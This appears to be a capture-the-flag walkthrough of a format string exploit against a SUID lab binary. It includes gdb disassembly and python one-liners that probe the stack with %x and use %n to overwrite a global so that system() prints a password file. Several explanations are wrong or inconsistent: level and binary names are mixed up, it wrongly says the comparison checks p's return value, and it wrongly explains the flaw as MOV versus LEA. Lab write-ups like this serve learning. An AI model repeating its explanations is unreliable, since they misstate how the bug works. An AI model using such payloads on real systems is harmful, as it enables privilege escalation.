# Level 5

## First clue
- once logged in as level4 we find again an executable with the same behavior of ./level4, `level5` owned by `level6` and the SUID (SET USER ID) bit set(indicated by the s in place of the execute permission for the owner (rws)) that means that when anyone execute the file it will run with the privileges of level5, not the person executing it
- we try to execute it without arguments and we get the prompt back
- if we write something, that something is copied back as output

## Inspect with gdb
- The binary contains printf, fgets, system, external functions used for input/output operations and executing commands, indicating potential interaction with the user and system.
```
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  p
0x08048457  n
0x080484a7  main
0x080484c0  __libc_csu_init
0x08048530  __libc_csu_fini
0x08048532  __i686.get_pc_thunk.bx
0x08048540  __do_global_ctors_aux
0x0804856c  _fini
(gdb) pdisas frame_dummy


```
- there are three main functions, `main`, `p` and `n`
- first we inspect main
## Main
```
   0x080484a7 <+0>:	push   %ebp
   0x080484a8 <+1>:	mov    %esp,%ebp
   0x080484aa <+3>:	and    $0xfffffff0,%esp
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    

```
- main is simple, makes a stack alignment and call function `n`
## Function n

```
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret  
```
- allocates 0x218 = 536 bytes
- reads input from user using fgets, storing input in buffer at 0x208(%ebp)
- it calls function p passing as argument the user input retrieved with fget and stored in 0x208 
- it makes some comparisons and a conditional jump (jne) that suggests that function n decide to execute further instructions based on the return of function p. Which instructions? If the comparison return true it launch a shell via a call to system
## Function p
```
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.

```
- allocates 24 bytes (0x18 in hexa)
- it moves to eax regisster a value located at ebp+0x8 that could be an argument pased to the p function
- it passes that argument to the printf funciton
## Vulnerability
- `0x0804844a <+6>:	mov    0x8(%ebp),%eax` => this instruction MOVES THE CONTENT (and not the address) of the argument passed to p function (that is the user input) directly to eax for the printf function to use it as argument as well. This means that the string ritten by the user is passed to printf as it is, without proper validation .
If the proper validation had been put in place we should see instead a LEA (load effective address) of the argument passed to p.
We can exploit a format string vulnerability. How?

## Toward the Solution
- back to function n, it compares the content of the return of function p with the hexadecimal value 0x1025544, at this line `0x08048492 <+59>:  cmp    $0x1025544,%eax`. 0x1025544 is 16930116 in decimal.
If we find a way for function p to return value 16930116n we get true and the system call is triggered. 

## Finding Buffer Position: 
We first find the position of our buffer in memory by injecting format specifiers into the input string and observing the output. For example:


`python -c 'print "aaaa" + " %x" * 15' | ./level4`

## Manipulating Return Value: 
Once we know the buffer's position, we construct an input string that manipulates the return value of function p to 16930116. This is done by padding the memory address of the variable m and using the %n format specifier.

`python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4`
Here, "\x10\x98\x04\x08" represents the memory address of m, and %16930112d pads the address, while %12$n writes the number of characters processed so far to the address pointed to by the 12th argument.

## Triggering System Call
With the return value manipulated, the comparison in function n will evaluate to true, triggering the system call that directly print the /level5/.pass containing the flag
